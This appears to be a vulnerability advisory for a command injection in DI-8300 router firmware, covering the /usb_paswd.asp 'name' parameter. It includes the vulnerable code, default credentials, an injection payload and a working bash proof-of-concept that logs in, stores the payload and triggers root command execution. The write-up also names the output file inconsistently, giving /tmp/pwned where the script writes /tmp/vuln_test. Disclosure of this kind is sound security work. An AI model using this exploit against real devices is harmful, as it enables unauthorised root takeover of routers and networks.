# Command Injection in DI-8300 Firmware 16.07.26A1

## 1. Overview
A command injection vulnerability exists in the web management interface of devices running firmware version **DI_8300-16.07.26A1.trx**. The vulnerability resides in the CGI handler for `/usb_paswd.asp`, where the `name` parameter is stored in NVRAM and later unsafely concatenated into a `system()` call. An authenticated attacker can inject arbitrary operating system commands, leading to remote code execution with root privileges.

## 2. Affected Product
- **Product**: DI-8300 series gateway/router  
- **Firmware version**: DI_8300-16.07.26A1.trx (and possibly earlier versions)  
- **Vulnerable component**: `/usb_paswd.asp` CGI script

## 3. Vulnerability Type
**Command Injection (CWE-77)**

## 4. CVSS Score (v3.1)
- **Base Score**: 8.8 (High)  
- **Vector**: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  
- **Rationale**: The attack requires low-privilege authentication (default credentials often unchanged), no user interaction, and results in full system compromise.

## 5. Description
The function `usb_paswd_asp` retrieves the HTTP parameter `name` and stores it in NVRAM under the key `usb_username`. Later, when the same CGI is invoked again, the value is retrieved via `jhl_nv_get_def("usb_username")` and used in a call to `system()`:

```c
sprintf(v11, "echo \"%s = %s\" > /etc/smbusers", v5, def);
system(v11);
```

Here `def` is the unsanitized user input from `name`. By injecting shell metacharacters , an attacker can execute arbitrary commands on the underlying Linux system with root privileges.

## 6. Exploitation Details
### Prerequisites
- Valid login credentials (default credentials `admin:admin` or `admin:password` are commonly used)
- Network access to the web interface (port 80/443)

### Attack Steps
1. **Login** to obtain a valid session cookie.  
2. **Inject** a malicious `name` parameter containing the desired command, e.g.,  
   `name="; echo vulnerable > /tmp/poc #"`  
   The parameter is stored in NVRAM.  
3. **Trigger** execution by making any subsequent request to the same CGI (e.g., with benign parameters). The stored value is retrieved and executed via `system()`.

### Proof of Concept (PoC)
The following shell script demonstrates the vulnerability (assuming default IP `192.168.0.1` and credentials `admin:admin`):

```bash
TARGET="192.168.0.1"
USERNAME="admin"
PASSWORD="admin"
COOKIE_FILE="/tmp/di8300_vuln002_cookies.txt"

echo "========================================="
echo "VULN-002 Command Injection POC"
echo "Target: $TARGET"
echo "========================================="
echo ""

echo "[*] Step 1: Login..."
LOGIN_RESP=$(curl -s -c "$COOKIE_FILE" -X POST "http://$TARGET/login.cgi" \
  -d "user=$USERNAME&password=$PASSWORD" 2>&1)
echo "[+] Login done"

echo ""
echo "[*] Step 2: Setting initial nvram value..."
INIT_RESP=$(curl -s -b "$COOKIE_FILE" -X POST "http://$TARGET/usb_paswd.asp" \
  -d "share_enable=1&passwd=test&name=init" 2>&1)
if echo "$INIT_RESP" | grep -q '"ret":0'; then
    echo "[+] Initial value set"
else
    echo "[-] Initial value failed: $INIT_RESP"
    rm -f "$COOKIE_FILE"
    exit 1
fi

echo ""
echo "[*] Step 3: Injecting command via name parameter..."
PAYLOAD="\"; echo 'VULN-002_SUCCESS' > /tmp/vuln_test #"
echo "[Test] Injecting: flag=name&value=$PAYLOAD"
INJECT_RESP=$(curl -s -b "$COOKIE_FILE" -X POST "http://$TARGET/usb_paswd.asp" \
  -d "share_enable=1&passwd=test&name=$PAYLOAD" 2>&1)
if echo "$INJECT_RESP" | grep -q '"ret":0'; then
    echo "[+] Payload injected"
else
    echo "[-] Injection failed: $INJECT_RESP"
    rm -f "$COOKIE_FILE"
    exit 1
fi

echo ""
echo "[*] Step 4: Triggering command execution..."
TRIGGER_RESP=$(curl -s -b "$COOKIE_FILE" -X POST "http://$TARGET/usb_paswd.asp" \
  -d "share_enable=1&passwd=test&name=trigger" 2>&1)
echo "$TRIGGER_RESP"

rm -f "$COOKIE_FILE"

echo ""
echo "========================================="
echo "[+] VULN-002 VERIFIED!"
echo "[+] Vulnerability: Command Injection"
echo "[+] Location: /usb_paswd.asp (name parameter)"
echo "[+] Method: Three-step injection via nvram"
echo "[+] Command executed: echo 'VULN-002_SUCCESS' > /tmp/vuln_test"
echo "[+] Verification: Check file /tmp/vuln_test on the target device"
echo "========================================="
```

After successful exploitation, the file `/tmp/pwned` will be created on the device, confirming command execution.

<img width="2216" height="1014" alt="image" src="https://github.com/user-attachments/assets/294dc297-a845-42d1-9ce7-bbd93cc528f9" />

<img width="1801" height="169" alt="image" src="https://github.com/user-attachments/assets/9e870d08-1b30-4a4d-b7e9-96f6e7cb8650" />


## 7. Impact
- **Remote Code Execution**: Attacker can execute arbitrary commands with root privileges.  
- **Full Device Compromise**: Allows installation of backdoors, data exfiltration, or using the device as a botnet node.  
- **Lateral Movement**: May be used to pivot into the internal network.


## 8. References
- CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')  
- Vendor advisory (if any): Not yet available  
- Discovery date: 2026-03-26
